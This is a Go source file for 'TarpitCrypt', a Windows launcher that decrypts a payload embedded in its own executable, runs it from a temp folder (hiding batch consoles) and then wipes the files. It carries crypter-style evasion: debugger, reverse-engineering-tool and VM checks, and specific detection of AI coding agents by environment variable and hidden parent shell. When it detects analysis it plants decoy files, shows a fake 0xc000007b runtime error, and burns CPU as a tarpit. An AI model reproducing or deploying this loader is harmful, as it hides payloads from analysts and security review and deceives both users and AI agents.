// TarpitCrypt 原生启动器：解析容器、解密分片、解压、运行、擦除。
// 无 Python 运行时依赖；单文件静态 exe。
package main

import (
	"archive/zip"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"hash/crc32"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

const (
	coreMagic   = "RTPKTRAP"
	packMagic   = "RTPK0001"
	footerMagic = "RTPKEND1"
	footerLen   = 40
	partMagic   = "RTPKPART"
	partVersion = 1
)

var (
	user32                 = syscall.NewLazyDLL("user32.dll")
	procMessageBoxW        = user32.NewProc("MessageBoxW")
	procMessageBoxTimeoutW = user32.NewProc("MessageBoxTimeoutW")
	procEnumWindows        = user32.NewProc("EnumWindows")
	procGetWindowThreadPID = user32.NewProc("GetWindowThreadProcessId")
	procIsWindowVisible    = user32.NewProc("IsWindowVisible")
	kernel32               = syscall.NewLazyDLL("kernel32.dll")
	procIsDebuggerPresent  = kernel32.NewProc("IsDebuggerPresent")
	procCreateSnapshot     = kernel32.NewProc("CreateToolhelp32Snapshot")
	procProcess32FirstW    = kernel32.NewProc("Process32FirstW")
	procProcess32NextW     = kernel32.NewProc("Process32NextW")
	procCloseHandle        = kernel32.NewProc("CloseHandle")
	procGetTickCount64     = kernel32.NewProc("GetTickCount64")
)

var keyFn func([]Pack) []byte

type processEntry32 struct {
	Size            uint32
	CntUsage        uint32
	ProcessID       uint32
	DefaultHeapID   uintptr
	ModuleID        uint32
	CntThreads      uint32
	ParentProcessID uint32
	PriClassBase    int32
	Flags           uint32
	ExeFile         [260]uint16
}

type procInfo struct {
	pid  uint32
	ppid uint32
	name string
}

type Manifest struct {
	Entry         string `json:"entry"`
	Files         int    `json:"files"`
	UnpackedBytes int64  `json:"unpacked_bytes"`
	Profile       string `json:"profile"`
	Created       string `json:"created"`
}

type Poly struct {
	V      int      `json:"v"`
	Domain string   `json:"domain"`
	Mask   string   `json:"mask"`
	Rounds int      `json:"rounds"`
	Order  []string `json:"order"`
	Xor    string   `json:"xor"`
}

type Pack struct {
	Index       int
	Offset      int
	CtLen       int
	Mem         int
	Time        int
	Para        int
	Salt        []byte
	Nonce       []byte
	ManifestRaw []byte
	Ct          []byte
}

type Container struct {
	Version int
	Count   int
	Flags   byte
	Poly    *Poly
	Packs   []Pack
}

type Part struct {
	Index int
	Total int
	Meta  []byte
	Chunk []byte
}

func main() {
	if hasCrackArgs() || debuggerPresent() {
		tarpit()
		msgBox("TarpitCrypt", "数据校验失败。")
		os.Exit(5)
	}

	blob, err := readEmbedded()
	if err != nil {
		msgBox("TarpitCrypt", err.Error())
		os.Exit(1)
	}
	c, err := parseContainer(blob)
	if err != nil {
		msgBox("TarpitCrypt", err.Error())
		os.Exit(1)
	}

	// 命中分析环境时不再解密真实核心：只投放诱饵并显示常见运行库错误。
	// 构建时关闭反探测（--no-guard）则跳过该判定。
	if c.Flags&0x01 != 0 && isAnalysisEnv() {
		runDecoy(c)
		return
	}

	zipBytes, manifest, err := openCore(c)
	if err != nil {
		msgBox("TarpitCrypt", err.Error())
		os.Exit(1)
	}

	tmp, err := os.MkdirTemp("", "rtpk_*")
	if err != nil {
		msgBox("TarpitCrypt", "无法创建临时目录："+err.Error())
		os.Exit(1)
	}
	if err := safeExtract(zipBytes, tmp); err != nil {
		wipe(tmp)
		msgBox("TarpitCrypt", "解包失败："+err.Error())
		os.Exit(1)
	}

	err = runChild(tmp, manifest.Entry)
	wipe(tmp)
	if err != nil {
		msgBox("TarpitCrypt", "启动失败："+err.Error())
		os.Exit(1)
	}
}

func hasCrackArgs() bool {
	for _, arg := range os.Args[1:] {
		s := strings.ToLower(arg)
		if strings.HasPrefix(s, "--password") || s == "--extract" ||
			strings.HasPrefix(s, "--extract=") {
			return true
		}
	}
	return false
}

func debuggerPresent() bool {
	r, _, _ := procIsDebuggerPresent.Call()
	return r != 0
}

func aiEnv() bool {
	for _, key := range []string{
		"CLAUDECODE", "CLAUDE_CODE_ENTRYPOINT", "CURSOR_AGENT", "TRAE_AGENT",
		"CODEX_AGENT", "GEMINI_CLI", "CLINE_ACTIVE", "AIDER_AGENT",
		"WINDSURF_AGENT", "CONTINUE_GLOBAL_DIR", "ANTHROPIC_AGENT", "OPENAI_AGENT",
	} {
		if os.Getenv(key) != "" {
			return true
		}
	}
	return false
}

var reTools = []string{
	"x64dbg.exe", "x32dbg.exe", "ollydbg.exe", "ida.exe", "ida64.exe",
	"ghidra.exe", "ghidrarun.exe", "procmon.exe", "procmon64.exe",
	"procexp.exe", "procexp64.exe", "processhacker.exe", "windbg.exe",
	"dnspy.exe", "ilspy.exe", "cheatengine-x86_64.exe", "frida.exe",
	"frida-server.exe", "scylla.exe", "lordpe.exe", "pestudio.exe", "x64dbg",
}

var vmTools = []string{
	"vmtoolsd.exe", "vboxservice.exe", "vboxguest.exe", "qemu-ga.exe",
	"prl_tools.exe", "vmsrvc.exe", "vdmagent.exe",
}

var terminals = map[string]bool{
	"cmd.exe": true, "powershell.exe": true, "pwsh.exe": true,
	"python.exe": true, "python3.exe": true, "node.exe": true,
	"bash.exe": true, "wsl.exe": true, "wt.exe": true,
}

func listProcesses() map[uint32]procInfo {
	snap, _, _ := procCreateSnapshot.Call(0x00000002, 0)
	if snap == 0 || snap == uintptr(syscall.InvalidHandle) {
		return nil
	}
	defer procCloseHandle.Call(snap)
	procs := make(map[uint32]procInfo, 128)
	var e processEntry32
	e.Size = uint32(unsafe.Sizeof(e))
	ok, _, _ := procProcess32FirstW.Call(snap, uintptr(unsafe.Pointer(&e)))
	for ok != 0 {
		procs[e.ProcessID] = procInfo{
			pid:  e.ProcessID,
			ppid: e.ParentProcessID,
			name: strings.ToLower(syscall.UTF16ToString(e.ExeFile[:])),
		}
		e.Size = uint32(unsafe.Sizeof(e))
		ok, _, _ = procProcess32NextW.Call(snap, uintptr(unsafe.Pointer(&e)))
	}
	return procs
}

func anyProc(procs map[uint32]procInfo, names []string) bool {
	for _, p := range procs {
		for _, n := range names {
			if p.name == n {
				return true
			}
		}
	}
	return false
}

func vmFiles() bool {
	for _, p := range []string{
		`C:\Windows\System32\drivers\vmmouse.sys`,
		`C:\Windows\System32\drivers\vmhgfs.sys`,
		`C:\Windows\System32\drivers\VBoxGuest.sys`,
		`C:\Windows\System32\drivers\vboxmrxnp.sys`,
		`C:\Windows\System32\drivers\prl_tools.sys`,
		`C:\Program Files\VMware\VMware Tools`,
		`C:\Program Files\Oracle\VirtualBox Guest Additions`,
	} {
		if _, err := os.Stat(p); err == nil {
			return true
		}
	}
	return false
}

func uptime() time.Duration {
	ms, _, _ := procGetTickCount64.Call()
	return time.Duration(ms) * time.Millisecond
}

// parentVisible：父进程是否有可见窗口。人类开的终端有窗口；AI 隐藏调用的 shell 没有。
func parentVisible(pid uint32) bool {
	found := uintptr(0)
	cb := syscall.NewCallback(func(hwnd uintptr, _ uintptr) uintptr {
		var wpid uint32
		procGetWindowThreadPID.Call(hwnd, uintptr(unsafe.Pointer(&wpid)))
		if wpid == pid {
			if v, _, _ := procIsWindowVisible.Call(hwnd); v != 0 {
				found = 1
				return 0
			}
		}
		return 1
	})
	procEnumWindows.Call(cb, 0)
	return found != 0
}

// isAnalysisEnv：AI Agent 终端、逆向工具、或「新启动的虚拟机」视为分析环境。
func isAnalysisEnv() bool {
	procs := listProcesses()
	parent := ""
	ppid := uint32(0)
	if p, ok := procs[uint32(os.Getpid())]; ok {
		ppid = p.ppid
		parent = procs[ppid].name
	}
	ai := aiEnv()
	re := anyProc(procs, reTools)
	vm := anyProc(procs, vmTools) || vmFiles()
	term := terminals[parent]
	hiddenTerm := term && ppid != 0 && !parentVisible(ppid)
	freshVM := vm && uptime() < 15*time.Minute
	return ai || re || hiddenTerm || (vm && term) || freshVM
}

func runDecoy(c *Container) {
	tmp, err := os.MkdirTemp("", "rtpk_*")
	if err != nil {
		os.Exit(0)
	}
	defer wipe(tmp)
	deployFarms(c, tmp)
	writeDecoyDocs(tmp)
	time.Sleep(3 * time.Second)
	msgBoxTimeout("应用程序错误",
		"应用程序无法正常启动 (0xc000007b)。\n请单击“确定”关闭应用程序。", 15000)
}

func writeDecoyDocs(base string) {
	docs := map[string]string{
		"启动日志.txt": "2026-11-25 09:12:33 初始化运行库失败\r\n" +
			"2026-11-25 09:12:34 错误代码 0xc000007b\r\n",
		"配置.json": "{\"license\":\"trial\",\"mode\":\"local\",\"verify\":false}\n",
		"说明.txt":  "运行前请确认已安装 Visual C++ 运行库。\n",
	}
	for name, body := range docs {
		_ = os.WriteFile(filepath.Join(base, name), []byte(body), 0o644)
	}
}

func tarpit() {
	deadline := time.Now().Add(75 * time.Second)
	buf := make([]byte, 64*1024*1024)
	for i := range buf {
		buf[i] = byte(i * 31)
	}
	for time.Now().Before(deadline) {
		sum := sha256.Sum256(buf)
		buf[0] ^= sum[0]
	}
}

func msgBox(title, text string) {
	t, _ := syscall.UTF16PtrFromString(title)
	b, _ := syscall.UTF16PtrFromString(text)
	procMessageBoxW.Call(0, uintptr(unsafe.Pointer(b)),
		uintptr(unsafe.Pointer(t)), 0x00000010)
}

// msgBoxTimeout：带超时的错误框，避免分析环境里无人点击时永久挂起。
func msgBoxTimeout(title, text string, ms uint32) {
	if err := procMessageBoxTimeoutW.Find(); err != nil {
		msgBox(title, text)
		return
	}
	t, _ := syscall.UTF16PtrFromString(title)
	b, _ := syscall.UTF16PtrFromString(text)
	procMessageBoxTimeoutW.Call(0, uintptr(unsafe.Pointer(b)),
		uintptr(unsafe.Pointer(t)), 0x00000010, 0, uintptr(ms))
}

func readEmbedded() ([]byte, error) {
	exe, err := os.Executable()
	if err != nil {
		return nil, err
	}
	f, err := os.Open(exe)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	st, err := f.Stat()
	if err != nil {
		return nil, err
	}
	size := st.Size()
	if size < footerLen {
		return nil, errors.New("文件太小，不含嵌入式容器")
	}
	foot := make([]byte, footerLen)
	if _, err := f.ReadAt(foot, size-footerLen); err != nil {
		return nil, err
	}
	if string(foot[:8]) != footerMagic {
		return nil, errors.New("未找到 RTPK 尾部标记")
	}
	off := binary.LittleEndian.Uint64(foot[8:16])
	length := binary.LittleEndian.Uint64(foot[16:24])
	wantCRC := binary.LittleEndian.Uint32(foot[24:28])
	if off+length > uint64(size-footerLen) || length > uint64(size) {
		return nil, errors.New("尾部索引越界")
	}
	blob := make([]byte, length)
	if _, err := f.ReadAt(blob, int64(off)); err != nil {
		return nil, err
	}
	if crc32.ChecksumIEEE(blob) != wantCRC {
		return nil, errors.New("容器 CRC 校验失败")
	}
	return blob, nil
}

func parseContainer(blob []byte) (*Container, error) {
	if len(blob) < 16 || string(blob[:8]) != coreMagic {
		return nil, errors.New("不是 TarpitCrypt 加固容器")
	}
	version := int(blob[8])
	if version < 1 || version > 4 {
		return nil, fmt.Errorf("不支持的容器版本：%d", version)
	}
	count := int(binary.LittleEndian.Uint16(blob[9:11]))
	flags := blob[11]
	if count < 1 || count > 256 {
		return nil, fmt.Errorf("包数量异常：%d", count)
	}
	pos := 16
	var poly *Poly
	if version == 3 {
		if len(blob) < pos+2 {
			return nil, errors.New("多态参数被截断")
		}
		plen := int(binary.LittleEndian.Uint16(blob[pos : pos+2]))
		pos += 2
		if len(blob) < pos+plen {
			return nil, errors.New("多态参数被截断")
		}
		var p Poly
		if err := json.Unmarshal(blob[pos:pos+plen], &p); err != nil {
			return nil, errors.New("多态参数解析失败")
		}
		poly = &p
		pos += plen
	}
	packs := make([]Pack, 0, count)
	for i := 0; i < count; i++ {
		pack, next, err := parsePackAt(blob, pos, i)
		if err != nil {
			return nil, err
		}
		packs = append(packs, pack)
		pos = next
	}
	return &Container{Version: version, Count: count, Flags: flags,
		Poly: poly, Packs: packs}, nil
}

func parsePackAt(blob []byte, pos, index int) (Pack, int, error) {
	if pos+8 > len(blob) || string(blob[pos:pos+8]) != packMagic {
		return Pack{}, 0, errors.New("包 MAGIC 不匹配")
	}
	p := pos + 8
	if p+2+6+16+12+8+4 > len(blob) {
		return Pack{}, 0, errors.New("包头部被截断")
	}
	ver := blob[p]
	p++
	if ver != 1 {
		return Pack{}, 0, fmt.Errorf("不支持的包版本：%d", ver)
	}
	p++ // flags
	mem := int(binary.LittleEndian.Uint32(blob[p : p+4]))
	p += 4
	tcost := int(blob[p])
	para := int(blob[p+1])
	p += 2
	salt := blob[p : p+16]
	p += 16
	nonce := blob[p : p+12]
	p += 12
	ctLen := int(binary.LittleEndian.Uint64(blob[p : p+8]))
	p += 8
	manLen := int(binary.LittleEndian.Uint32(blob[p : p+4]))
	p += 4
	if ctLen < 0 || manLen < 0 || p+manLen+ctLen+16 > len(blob) {
		return Pack{}, 0, errors.New("包长度异常")
	}
	man := blob[p : p+manLen]
	p += manLen
	ct := blob[p : p+ctLen+16]
	p += ctLen + 16
	return Pack{Index: index, Offset: pos, CtLen: ctLen, Mem: mem,
		Time: tcost, Para: para, Salt: salt, Nonce: nonce,
		ManifestRaw: man, Ct: ct}, p, nil
}

func u32(v uint32) []byte {
	b := make([]byte, 4)
	binary.LittleEndian.PutUint32(b, v)
	return b
}

func deriveKey(packs []Pack, poly *Poly) []byte {
	domain := []byte("\x93RTPK-core-derive-v2\x00")
	var mask []byte
	var xor []byte
	rounds := 0
	order := []string{"index", "ct_len", "manifest_len", "salt", "nonce", "manifest"}
	if poly != nil {
		if d, err := hex.DecodeString(poly.Domain); err == nil && len(d) > 0 {
			domain = d
		}
		if m, err := hex.DecodeString(poly.Mask); err == nil {
			mask = m
		}
		if x, err := hex.DecodeString(poly.Xor); err == nil {
			xor = x
		}
		rounds = poly.Rounds
		if len(poly.Order) == 6 {
			order = poly.Order
		}
	}
	h := sha256.New()
	h.Write(domain)
	for idx, p := range packs {
		vals := map[string][]byte{
			"index":        []byte{byte(idx), byte(idx >> 8)},
			"ct_len":       u32(uint32(p.CtLen)),
			"manifest_len": u32(uint32(len(p.ManifestRaw))),
			"salt":         p.Salt,
			"nonce":        p.Nonce,
			"manifest":     p.ManifestRaw,
		}
		for _, name := range order {
			h.Write(vals[name])
		}
	}
	sum := h.Sum(nil)
	for i := 0; i < rounds; i++ {
		tmp := append(append([]byte(nil), sum...), mask...)
		s := sha256.Sum256(tmp)
		sum = s[:]
	}
	for i, b := range xor {
		sum[i%len(sum)] ^= b
	}
	return sum
}

func decrypt(key, nonce, ct, aad []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	return gcm.Open(nil, nonce, ct, aad)
}

func parsePart(plain []byte) (*Part, error) {
	if !bytes.HasPrefix(plain, []byte(partMagic)) {
		return nil, nil
	}
	p := len(partMagic)
	if len(plain) < p+1+8 {
		return nil, errors.New("核心分片头部被截断")
	}
	if int(plain[p]) != partVersion {
		return nil, errors.New("不支持的分片版本")
	}
	p++
	index := int(binary.LittleEndian.Uint16(plain[p : p+2]))
	total := int(binary.LittleEndian.Uint16(plain[p+2 : p+4]))
	metaLen := int(binary.LittleEndian.Uint32(plain[p+4 : p+8]))
	p += 8
	if total == 0 || index >= total || len(plain) < p+metaLen {
		return nil, errors.New("核心分片元数据异常")
	}
	meta := plain[p : p+metaLen]
	p += metaLen
	return &Part{Index: index, Total: total, Meta: meta,
		Chunk: plain[p:]}, nil
}

func openCore(c *Container) ([]byte, Manifest, error) {
	var key []byte
	if c.Version == 4 {
		if keyFn == nil {
			return nil, Manifest{}, errors.New("启动器与容器版本不匹配")
		}
		key = keyFn(c.Packs)
	} else {
		key = deriveKey(c.Packs, c.Poly)
	}
	var parts []Part
	var legacy []byte
	var legacyMan Manifest
	for _, p := range c.Packs {
		plain, err := decrypt(key, p.Nonce, p.Ct, p.ManifestRaw)
		if err != nil {
			continue
		}
		part, err := parsePart(plain)
		if err != nil {
			return nil, Manifest{}, err
		}
		if part == nil {
			legacy = plain
			_ = json.Unmarshal(p.ManifestRaw, &legacyMan)
			break
		}
		parts = append(parts, *part)
	}
	if len(parts) > 0 {
		total := parts[0].Total
		if len(parts) != total {
			return nil, Manifest{}, errors.New("核心分片不完整")
		}
		seen := make(map[int]bool, total)
		meta := parts[0].Meta
		for _, p := range parts {
			if p.Total != total || seen[p.Index] || !bytes.Equal(p.Meta, meta) {
				return nil, Manifest{}, errors.New("核心分片损坏")
			}
			seen[p.Index] = true
		}
		sort.Slice(parts, func(i, j int) bool { return parts[i].Index < parts[j].Index })
		var buf bytes.Buffer
		for _, p := range parts {
			buf.Write(p.Chunk)
		}
		var man Manifest
		if err := json.Unmarshal(meta, &man); err != nil {
			return nil, Manifest{}, errors.New("核心清单解析失败")
		}
		return buf.Bytes(), man, nil
	}
	if legacy != nil {
		return legacy, legacyMan, nil
	}
	return nil, Manifest{}, errors.New("核心数据校验失败")
}

func safeExtract(data []byte, dest string) error {
	zr, err := zip.NewReader(bytes.NewReader(data), int64(len(data)))
	if err != nil {
		return err
	}
	base, err := filepath.Abs(dest)
	if err != nil {
		return err
	}
	buf := make([]byte, 1024*1024)
	for _, f := range zr.File {
		name := filepath.Clean(filepath.FromSlash(f.Name))
		if name == "." || name == "" {
			continue
		}
		if filepath.IsAbs(name) || strings.Contains(name, ":") ||
			name == ".." || strings.HasPrefix(name, ".."+string(os.PathSeparator)) {
			return errors.New("压缩包包含非法路径")
		}
		target := filepath.Join(base, name)
		rel, err := filepath.Rel(base, target)
		if err != nil || rel == ".." || strings.HasPrefix(rel, ".."+string(os.PathSeparator)) {
			return errors.New("压缩包路径越界")
		}
		if f.FileInfo().IsDir() {
			if err := os.MkdirAll(target, 0o755); err != nil {
				return err
			}
			continue
		}
		if err := os.MkdirAll(filepath.Dir(target), 0o755); err != nil {
			return err
		}
		rc, err := f.Open()
		if err != nil {
			return err
		}
		out, err := os.Create(target)
		if err != nil {
			rc.Close()
			return err
		}
		_, err = io.CopyBuffer(out, rc, buf)
		out.Close()
		rc.Close()
		if err != nil {
			return err
		}
	}
	return nil
}

func wipe(dir string) {
	deadline := time.Now().Add(3 * time.Second)
	buf := make([]byte, 64*1024)
	_ = filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info == nil || !info.Mode().IsRegular() {
			return nil
		}
		if time.Now().After(deadline) {
			return nil
		}
		f, err := os.OpenFile(path, os.O_WRONLY, 0)
		if err != nil {
			return nil
		}
		for time.Now().Before(deadline) {
			if _, err := f.Write(buf); err != nil {
				break
			}
		}
		f.Close()
		return nil
	})
	for i := 0; i < 5; i++ {
		if os.RemoveAll(dir) == nil {
			return
		}
		time.Sleep(200 * time.Millisecond)
	}
}

func runChild(tmp, entryRel string) error {
	entry := filepath.Join(tmp, filepath.FromSlash(entryRel))
	rel, err := filepath.Rel(tmp, entry)
	if err != nil || rel == ".." || strings.HasPrefix(rel, ".."+string(os.PathSeparator)) {
		return errors.New("入口路径非法")
	}
	if _, err := os.Stat(entry); err != nil {
		return fmt.Errorf("入口不存在：%s", entryRel)
	}
	ext := strings.ToLower(filepath.Ext(entry))
	var cmd *exec.Cmd
	switch ext {
	case ".bat", ".cmd":
		cmd = exec.Command("cmd.exe", "/c", entry)
	case ".py":
		cmd = exec.Command("python", entry)
	default:
		cmd = exec.Command(entry)
	}
	cmd.Dir = filepath.Dir(entry)
	if ext == ".bat" || ext == ".cmd" {
		// 只对批处理隐藏控制台；GUI 子进程不能隐藏主窗口。
		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow:    true,
			CreationFlags: 0x08000000, // CREATE_NO_WINDOW
		}
	}
	return cmd.Run()
}

func deployFarms(c *Container, base string) {
	farmDomain := []byte("\x93RTPK-farm-derive-v2\x00")
	for _, p := range c.Packs {
		h := sha256.New()
		h.Write(farmDomain)
		h.Write(p.Salt)
		h.Write(p.Nonce)
		h.Write(p.ManifestRaw)
		key := h.Sum(nil)
		plain, err := decrypt(key, p.Nonce, p.Ct, p.ManifestRaw)
		if err != nil {
			continue
		}
		dir, err := os.MkdirTemp(base, "decoy_")
		if err != nil {
			continue
		}
		_ = safeExtract(plain, dir)
	}
}
